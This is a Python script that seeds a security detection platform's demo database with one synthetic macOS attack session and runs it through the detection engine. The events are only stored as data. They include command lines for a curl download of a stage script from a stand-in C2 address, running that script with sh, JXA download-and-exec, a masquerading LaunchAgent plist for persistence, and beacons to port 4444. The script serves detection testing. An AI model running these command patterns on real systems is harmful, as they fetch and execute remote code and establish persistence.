"""Seed a macOS detonation scenario (roadmap 3.2) for the demo/portfolio.

The macOS rules (osascript LOLBin, LaunchAgents persistence, masquerading)
have had no demo run since they landed — the demo DB is all windows/linux.
This seeds one macOS session through the REAL detection engine so the
platform story is complete end-to-end:

    osascript (JXA download-and-exec) → curl stage → C2 beacon → LaunchAgent plist

Beacons to the campaign C2 (203.0.113.88) so it clusters with the existing
Shelf-Stack runs — macOS variants belong to the same campaign.

Run from backend/:  python -m app.seed_macos
"""

import datetime
import uuid

from .core.db import db_session, init_db
from .models import event as event_store
from .models import run as run_store
from .services import detection

SAMPLE = "com.apple.installer.app"  # masquerading installer name
C2 = "203.0.113.88"  # shared campaign C2 — clusters with the Shelf-Stack pair


def _ts(hour: int, minute: int, second: int) -> str:
    # Aug 6 — alongside the campaign pair (Aug 5/6) so it clusters as history
    # and never sorts as the newest run (which would shadow live detonations).
    return datetime.datetime(2026, 8, 6, hour, minute, second, tzinfo=datetime.timezone.utc).isoformat()


def _events(run_id: str) -> list[dict]:
    """osascript JXA download-and-exec → curl stage → beacon → LaunchAgent plist."""
    return [
        {"run_id": run_id, "platform": "macos", "event_type": "process_create", "timestamp": _ts(15, 30, 1),
         "pid": 4000, "ppid": 1, "process_name": "osascript",
         "command_line": "osascript -l JavaScript -e 'ObjC.import(\"Foundation\"); ...downloadAndExec()'"},
        {"run_id": run_id, "platform": "macos", "event_type": "process_create", "timestamp": _ts(15, 30, 4),
         "pid": 4001, "ppid": 4000, "process_name": "curl",
         "command_line": "curl -s http://203.0.113.88/stage.sh -o /tmp/.stage.sh"},
        {"run_id": run_id, "platform": "macos", "event_type": "process_create", "timestamp": _ts(15, 30, 6),
         "pid": 4002, "ppid": 4000, "process_name": "sh",
         "command_line": "sh /tmp/.stage.sh"},
        {"run_id": run_id, "platform": "macos", "event_type": "file_write", "timestamp": _ts(15, 30, 9),
         "pid": 4000, "process_name": "osascript",
         "file_path": "/Users/victim/Library/LaunchAgents/com.apple.Updater.plist"},
        # 5 beacons at 4s cadence — the shared campaign C2.
        *[
            {"run_id": run_id, "platform": "macos", "event_type": "network_connection",
             "timestamp": _ts(15, 30, 12 + i * 4),
             "pid": 4002, "dest_ip": C2, "dest_port": 4444, "protocol": "TCP"}
            for i in range(5)
        ],
        {"run_id": run_id, "platform": "macos", "event_type": "network_connection", "timestamp": _ts(15, 31, 0),
         "pid": 4002, "dest_ip": "1.1.1.1", "dest_port": 443, "protocol": "TCP"},
    ]


def main() -> dict:
    init_db()
    with db_session() as conn:
        rid = uuid.uuid4().hex[:12]
        run_store.create_run(conn, rid, sample_name=SAMPLE, platform="macos", session_type="analysis")
        events = _events(rid)
        for ev in events:
            event_store.insert_event(conn, ev)
        alerts = detection.evaluate_batch(conn, rid, events)
        # Backdate so the run reads as history alongside the campaign pair.
        conn.execute(
            "UPDATE runs SET started_at = ?, completed_at = ? WHERE run_id = ?",
            (_ts(15, 30, 1), _ts(15, 31, 0), rid),
        )
        conn.execute("UPDATE alerts SET triggered_at = ? WHERE run_id = ?", (_ts(15, 31, 0), rid))
    print(f"Seeded macOS run  {SAMPLE}  {rid}  {len(events)} events, {len(alerts)} alerts")
    print(f"  rules: {sorted({a.rule_id for a in alerts})}")
    print("Open the webapp, or run:  outpost show " + rid)
    return {"run_id": rid}


if __name__ == "__main__":
    main()
